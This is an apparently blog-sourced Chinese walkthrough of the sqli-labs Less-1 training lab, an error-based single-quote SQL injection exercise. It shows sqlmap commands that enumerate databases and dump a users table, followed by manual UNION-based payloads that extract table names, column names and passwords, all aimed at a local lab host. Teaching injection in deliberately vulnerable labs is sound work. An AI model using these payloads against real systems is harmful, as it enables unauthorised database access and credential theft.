## [[sqli-labs](https://github.com/Audi-1/sqli-labs)] [[Less 01 - Error Based Single Quotes](http://127.0.0.1/Less-1/)] [[解题报告](http://exp-blog.com/2019/06/02/pid-3882/)]

------

## 题目分析


乍一看似乎无从入手，其实注意看提示即可，提示是以数值型的 `id` 作为请求参数。

![](http://exp-blog.com/wp-content/uploads/2019/06/0beda8f79e5de7fee20a62877a2a89e0.png)

于是尝试在 url 中追加参数 `?id=1` ，可以看到页面回显了数据库的查询内容：

![](http://exp-blog.com/wp-content/uploads/2019/06/a4c9607a6d1c6e8552e5a737360f74ef.png)

改变 `id` 的值，可以查到不同的内容，推测此处是注入点：

![](http://exp-blog.com/wp-content/uploads/2019/06/f7141c59509a1036c6ad5b15f6a62774.png)

## 使用 sqlmap 注入（不推荐）

先尝试下使用 sqlmap 解题（非必要不推荐这种解题方式，因为对于学习 sqli 毫无帮助）。

先通过以下命令查询所有数据库：

```shell
sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 --dbs
```

得到 6 个数据库：

```shell
available databases [6]:
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] sys
```

![](http://exp-blog.com/wp-content/uploads/2019/06/42a36ce3e301ed22451084436692b87f.png)

然后通过以下命令查询到当前数据库为 `security`

```shell
sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 --current-db
```

![](http://exp-blog.com/wp-content/uploads/2019/06/c91c61fc2d9cf066c790a712eea8dd2e.png)

再通过以下命令查询到 `security` 数据库的所有表名：

```shell
sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 -D security --tables
```

![](http://exp-blog.com/wp-content/uploads/2019/06/813a6833d6abfffdea1057c749a1fdf2.png)

得到 4 个表名：

```shell
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

很明显，`users` 表应该就是我们的目标表，通过以下命令把整个表的数据 dump 下来：

```shell
sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 -D security -T users --dump
```

成功脱裤，完成挑战：

```shell
Database: security
Table: users
[13 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | Dumb     | Dumb       |
| 2  | Angelina | I-kill-you |
| 3  | Dummy    | p@ssword   |
| 4  | secure   | crappy     |
| 5  | stupid   | stupidity  |
| 6  | superman | genious    |
| 7  | batman   | mob!le     |
| 8  | admin    | admin      |
| 9  | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
```

![](http://exp-blog.com/wp-content/uploads/2019/06/6f129d954ebe009d8915cd6f643c98d5.png)


## 手工注入（推荐使用 Burp 辅助）

注意标题给出了两个提示：

- Error Based
- Single Quotes

那么尝试在参数后用单引号闭合 `?id=1'` 看下效果：

![](http://exp-blog.com/wp-content/uploads/2019/06/1600b933fdd3eb0378baad57cff94a62.png)

页面报错，而且从错误信息中，我们注意到两个关键信息：

- 数据库类型是 mysql
- 错误位置是 `'1'' LIMIT 0,1` （其中 `1'` 是我们输入的内容，不难推测**输入值会自动被单引号包围**）

结合异常信息，猜测这条 SQL 应该形如：

```sql
$sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT 0,1"
```

这种 SQL 要注入其实不难：

- 先闭合单引号
- 然后用 `union` 关联查询其他表的信息 （列数可以通过 `order by` 测试，本题测试到是 3 列）
- 最后再通过行注释处理掉末尾的 `LIMIT` 即可 （ MySql 的行注释有两种方式：`#` 和 `-- `，注意**后一种方式末尾至少有一个空格** ）

于是可以构造 payload 为 ：`?id=1' union select 1, 2, 3 #` 或 `?id=1' union select 1, 2, 3 --+`

> 注意，上面的 payload 只适用于 Burp Suite。若通过浏览器注入，需要对几个特殊字符做 URL 编码：空格要编码成 `%20` ，`#` 要编码成 `%23` 。特别地，`-- ` 刚好在 URL 末尾，而末尾的空格会被浏览器自动删掉，即使编码也不会保留，此时需要利用 URL 把 `+` 识别为空格的特性，使用 `--+` 代替。

![](http://exp-blog.com/wp-content/uploads/2019/06/001ed9c5b8d6d4d1a14ca43578f2cacd.png)

可以看到第 2、3 列被回显到页面，因此可以利用这两列查询我们想要的信息。

例如查询 mysql 的版本以及当前数据库，可以构造 payload 如下：

```sql
?id=1' union select 1, version(), database() #
```

![](http://exp-blog.com/wp-content/uploads/2019/06/96ee8e9e407a71b0e81c054d32748fa9.png)

而通过这个 payload 可以查询当前数据库下的所有表名：

```sql
?id=1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema = (select database()) #
```

> 这里用到 mysql 的 `group_concat` 函数，其作用是把某一列的所有行值串接成一个字符串。而 `information_schema` 是系统表，可以查到数据库中的所有表结构。

![](http://exp-blog.com/wp-content/uploads/2019/06/a9aaf684bd177c80f3f81240ae4d7826.png)

从表名推测，`users` 就是我们的目标表，再次构造 payload 查询该表的表结构：

```sql
?id=1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name = 'users' #
```

![](http://exp-blog.com/wp-content/uploads/2019/06/e15243105d75129c7cd80c781fdbac61.png)

找到目标列名 `username` 和 `password` ，最后构造如下 payload 实现脱裤，完成挑战：

```sql
?id=1' union select 1, group_concat(username), group_concat(password) from users #
```

![](http://exp-blog.com/wp-content/uploads/2019/06/477288ec8b4770fed23d8a069699491f.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
